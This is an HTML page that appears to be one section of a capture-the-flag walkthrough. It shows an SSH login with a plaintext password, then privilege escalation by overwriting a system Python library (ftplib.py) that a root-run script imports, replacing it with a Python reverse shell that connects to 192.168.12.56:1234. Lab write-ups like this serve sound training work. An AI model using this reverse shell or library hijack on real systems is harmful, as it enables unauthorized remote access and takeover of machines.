<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.3 Log in with SSH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>4.3 Log in with SSH</u></b></h1><br />As we already have credentials of one more user “hades”. <br /><br />a) Log in as user “hades”. <br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$ssh</span>&nbsp;hades@192.168.12.78<br />Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PTpZTfU4vxgzvRBE<br /><br /></div></div><br /><br />b) Explore the “/opt/ftpclilent/ftpclient.py” file.<span style="background-color:#000000;"><br /><br /></span><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ftpclient<span style="color:#ff9d00;font-weight:700">/</span>ftpclient.py</div></div><br /><br /><span style="color:#ffa500;">Output:</span><span style="background-color:#000000;"><br />-</span><span style="background-color:#000000;">rw</span><span style="background-color:#000000;">-r--r-- 1 root </span><span style="background-color:#000000;">hades</span><span style="background-color:#000000;"> 262 Apr  6  2020 /opt/</span><span style="background-color:#000000;">ftpclient</span><span style="background-color:#000000;">/</span><span style="background-color:#000000;">ftpclient</span><span style="background-color:#000000;">.</span><span style="background-color:#000000;">py</span><br /><br />“hades” user doen't have any writable permissions over this file.<br /><br />Now let see what the file does.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ftpclient<span style="color:#ff9d00;font-weight:700">/</span>ftpclient.py<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/396-1.png" alt="images/396-1.png" /><br /><br />There's a file called “ftplib”.<br /><br />c) Look for that file.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;-name&nbsp;<span style="color:#3ad900;font-weight:400">"ftplib.py"</span><br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/396-2.png" alt="images/396-2.png" /><br /><br />d) Let's go to “/usr/lib/python2.7/” and check the file permissions.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<br /><span style="color:#7f0044;font-weight:400">$ls</span>&nbsp;-l&nbsp;ftplib.py</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/396-3.png" alt="images/396-3.png" /><br /><br />e) Delete all the content of “ftplib.py”<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>&nbsp;&gt;&nbsp;ftplib.py</div></div><br /><br />f) Add a Python Reverse Shell.<br /><br />More info <a href="https://github.com/security-cheatsheet/reverse-shell-cheatsheet">here</a>.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$nano</span>&nbsp;ftplib.py</div></div><br /><br />Add the following code.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#333333;font-weight:400">import</span>&nbsp;socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span style="color:#3ad900;font-weight:400">"192.168.12.56"</span>,<span style="color:#ff0044;font-weight:400">1234</span>));os.dup2(s.fileno(),<span style="color:#ff0044;font-weight:400">0</span>);&nbsp;os.dup2(s.fileno(),<span style="color:#ff0044;font-weight:400">1</span>);&nbsp;os.dup2(s.fileno(),<span style="color:#ff0044;font-weight:400">2</span>);p=subprocess.call([<span style="color:#3ad900;font-weight:400">"/bin/sh"</span>,<span style="color:#3ad900;font-weight:400">"-i"</span>]);&nbsp;</div></div><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>